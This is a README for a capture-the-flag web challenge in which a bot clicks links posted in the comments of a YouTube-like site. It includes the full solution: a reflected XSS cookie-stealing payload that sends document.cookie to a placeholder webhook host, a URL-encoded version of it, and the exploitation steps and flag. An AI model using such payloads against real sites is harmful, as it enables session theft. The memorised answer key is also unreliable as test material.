# Fazbear Tube CTF Challenge

## Description
In this challenge, there is a bot that automatically reads and clicks links on a YouTube page. The bot operates on the page as a regular user, and you are tasked with finding a way to steal the bot's cookies in order to capture the flag.

## Setup Instructions

### Prerequisites
- Docker and Docker Compose
- Node.js (for local development)
- A webhook service (for capturing stolen cookies)

### Quick Start with Docker
1. Clone the repository
2. Create a `.env` file from the example:
   ```bash
   cp .env.example .env
   ```
3. Update the `.env` file with your flag value
4. Build and run the container:
   ```bash
   docker build -t youtube-ctf .
   docker run -d -p 80:80 --env-file .env youtube-ctf
   ```

### Local Development Setup
1. Install dependencies:
   ```bash
   npm install
   ```
2. Copy environment file:
   ```bash
   cp .env.example .env
   ```
3. Update `.env` with your flag value
4. Start Apache/PHP server
5. In another terminal, start the bot:
   ```bash
   npm start
   ```

### Bot Configuration
The bot automatically sets a cookie with the flag value from the `FLAG` environment variable. It visits the main page every 15 seconds and clicks on any links found in comments.

## Challenge Features

1. **Comment System**: URLs in comments are automatically converted to clickable `<a>` tags. The bot can see and click these URLs.
   
   Example comment:
   ```
   https://www.google.com
   ```

2. **Search Page with XSS Vulnerability**: The search page at `http://localhost/explore.php?search=` is vulnerable to reflected XSS.

   Test payload:
   ```
   http://localhost/explore.php?search=<script>alert('hi')</script>
   ```

## Exploit Development

### Objective
Create a payload to steal the bot's cookies and capture the flag.

### Basic Cookie Stealing Payload
```javascript
var img = document.createElement('img');
img.src = 'https://your-webhook-service.com/cookie?data=' + document.cookie;
document.querySelector('body').appendChild(img);
```

### URL-Encoded Payload for Search Parameter
```
http://localhost/explore.php?search=%3Cimg%20src%3D%22does-not-exist%22%20onerror%3D%22var%20img%20%3D%20document.createElement(%27img%27)%3B%20img.src%20%3D%20%27https%3A%2F%2Fyour-webhook-service.com%2Fcookie%3Fdata%3D%27%20%2B%20document.cookie%3B%20document.querySelector(%27body%27).appendChild(img)%3B%22%3E
```

### Exploitation Steps
1. Create a webhook endpoint to receive stolen cookies (e.g., using a webhook service like requestbin.com, or your own server)
2. Encode your payload for the search parameter
3. Post the URL as a comment on the Fazbear Tube
4. Wait for the bot to click your link
5. Check your webhook for the stolen cookies containing the flag

## Webhook Services
You can use temporary webhook services for testing:
- https://requestbin.com
- Or create your own webhook server

## Flag Format
The flag is stored in the bot's cookie as `flag=FLAG_VALUE`. The example flag in `.env.example` is `OqH0uz396fl4g{sukasa_kmitl_expoooo0o000}`.

## Troubleshooting
- **Bot not running**: Check if Node.js and Puppeteer dependencies are installed correctly
- **Cookies not set**: Verify the FLAG environment variable is set in `.env`
- **Links not being clicked**: Ensure the bot can access the web application and wait for the 15-second check interval
- **XSS not working**: Check browser security settings and ensure the payload is properly URL-encoded

## Security Notes
This challenge is designed for educational purposes in a controlled environment. Always ensure you have proper authorization before testing XSS vulnerabilities on any system.